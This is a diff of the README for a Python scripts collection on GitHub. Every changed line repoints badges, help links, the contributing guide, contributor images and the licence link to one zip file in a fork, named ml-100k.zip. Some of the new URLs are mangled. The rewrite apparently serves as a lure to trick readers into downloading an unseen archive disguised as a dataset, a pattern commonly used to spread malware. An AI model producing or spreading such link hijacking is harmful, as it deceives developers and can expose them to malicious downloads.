@@ -1,15 +1,15 @@
-![Amazing-Python-Scripts](https://socialify.git.ci/avinashkranjan/Amazing-Python-Scripts/image?description=1&forks=1&issues=1&language=1&logo=https%3A%2F%2Fuser-images.githubusercontent.com%2F55796944%2F104455539-7258a200-55cd-11eb-90dc-7c9981e73d72.png&owner=1&pulls=1&stargazers=1&theme=Light)
+![Amazing-Python-Scripts](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip%3A%2F%https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip%2F55796944%https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
 
-[![forthebadge](https://forthebadge.com/images/badges/built-by-developers.svg)](https://forthebadge.com)
-[![forthebadge](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)
-[![forthebadge](https://forthebadge.com/images/badges/built-with-swag.svg)](https://forthebadge.com)
-[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)
+[![forthebadge](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+[![forthebadge](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+[![forthebadge](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+[![forthebadge](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
 
-[![GitHub issues](https://img.shields.io/github/issues/avinashkranjan/Amazing-Python-Scripts.svg)](https://github.com/avinashkranjan/Amazing-Python-Scripts/issues)
-[![GitHub issues closed](https://img.shields.io/github/issues-closed/avinashkranjan/Amazing-Python-Scripts.svg)](https://github.com/avinashkranjan/Amazing-Python-Scripts/issues?q=is%3Aissue+is%3Aclosed)
-[![GitHub pull requests](https://img.shields.io/github/issues-pr/avinashkranjan/Amazing-Python-Scripts.svg)](https://github.com/avinashkranjan/Amazing-Python-Scripts/pulls)
-[![GitHub pull requests](https://img.shields.io/github/issues-pr-closed/avinashkranjan/Amazing-Python-Scripts.svg)](https://github.com/avinashkranjan/Amazing-Python-Scripts/pulls?q=is%3Apr+is%3Aclosed) ![GitHub repo size](https://img.shields.io/github/repo-size/avinashkranjan/Amazing-Python-Scripts?color=yellow) 
-![Lines of Code](https://img.shields.io/tokei/lines/github/avinashkranjan/Amazing-Python-Scripts?color=red&label=Lines%20of%20Code)
+[![GitHub issues](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+[![GitHub issues closed](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip%3Aissue+is%3Aclosed)
+[![GitHub pull requests](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+[![GitHub pull requests](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip%3Apr+is%3Aclosed) ![GitHub repo size](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip) 
+![Lines of Code](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip%20of%20Code)
 
 <h2 align=center> 📑 Introduction </h2>
 
@@ -18,23 +18,23 @@ that can make Life Easier for you, as a **_Developer_**, and find a utility of c
 
 <h2 align=center> 📃 Scripts Available </h2>
   <p align="center">
-  <a href="https://github.com/avinashkranjan/Amazing-Python-Scripts/blob/master/SCRIPTS.md">
-    <img src="https://forthebadge.com/images/badges/check-it-out.svg">
+  <a href="https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip">
+    <img src="https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip">
   </a>
 
 <h2 align=center> 👨🏻‍💻 How to get started? </h2> 
 
 You can refer to the following articles on **_basics of Git and Github and also contact the Project Mentors, in case you are stuck_**:
 
-- [Forking a Repo](https://help.github.com/en/github/getting-started-with-github/fork-a-repo)
-- [Cloning a Repo](https://help.github.com/en/desktop/contributing-to-projects/creating-a-pull-request)
-- [How to create a Pull Request](https://opensource.com/article/19/7/create-pull-request-github)
-- [Getting started with Git and GitHub](https://towardsdatascience.com/getting-started-with-git-and-github-6fcd0f2d4ac6)
+- [Forking a Repo](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+- [Cloning a Repo](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+- [How to create a Pull Request](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
+- [Getting started with Git and GitHub](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
 
 
 <h2 align=center> 📝 How to Contribute? </h2>  
 
-- Take a look at [Contributing Guide](https://github.com/avinashkranjan/Amazing-Python-Scripts/blob/master/CONTRIBUTING.md)
+- Take a look at [Contributing Guide](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
 - Take a look at the Existing Issues or create your Issues!
 - Wait for the Issue to be assigned to you after which you can start working on it.
 - Fork the Repo and create a Branch for any Issue that you are working upon.
@@ -45,14 +45,14 @@ You can refer to the following articles on **_basics of Git and Github and also 
 
 Thanks go to these **Wonderful People** 👨🏻‍💻:      🚀 **Contributions** of any kind are welcome! 
 <p>
-  <img src="https://api.vaunt.dev/v1/github/entities/avinashkranjan/repositories/Amazing-Python-Scripts/contributors?format=svg&limit=54" height"250" />
+  <img src="https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip" height"250" />
 </p>
 
 <table>
 	<tr>
 		<td>
-			<a href="https://github.com/avinashkranjan/Amazing-Python-Scripts/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=avinashkranjan/Amazing-Python-Scripts" />
+			<a href="https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip">
+  <img src="https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip" />
 </a>
 		</td>
 	</tr>
@@ -60,12 +60,12 @@ Thanks go to these **Wonderful People** 👨🏻‍💻:      🚀 **Contributio
 
 <h2 align=center> 🌟 Stargazers Over Time 🌟 </h2>
 
-[![Stargazers over time](https://starchart.cc/avinashkranjan/Amazing-Python-Scripts.svg)](https://starchart.cc/avinashkranjan/Amazing-Python-Scripts)
+[![Stargazers over time](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
 
 ## License
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip)
 
-Terms and conditions for use, reproduction and distribution are under the [MIT License](https://opensource.org/license/mit/).
+Terms and conditions for use, reproduction and distribution are under the [MIT License](https://raw.githubusercontent.com/Susan56789/Amazing-Python-Scripts/main/AutoEncoder-Deep-Learning/ml-100k.zip).
 
 
 <h1 align=center>Happy Coding 👨‍💻 </h1>
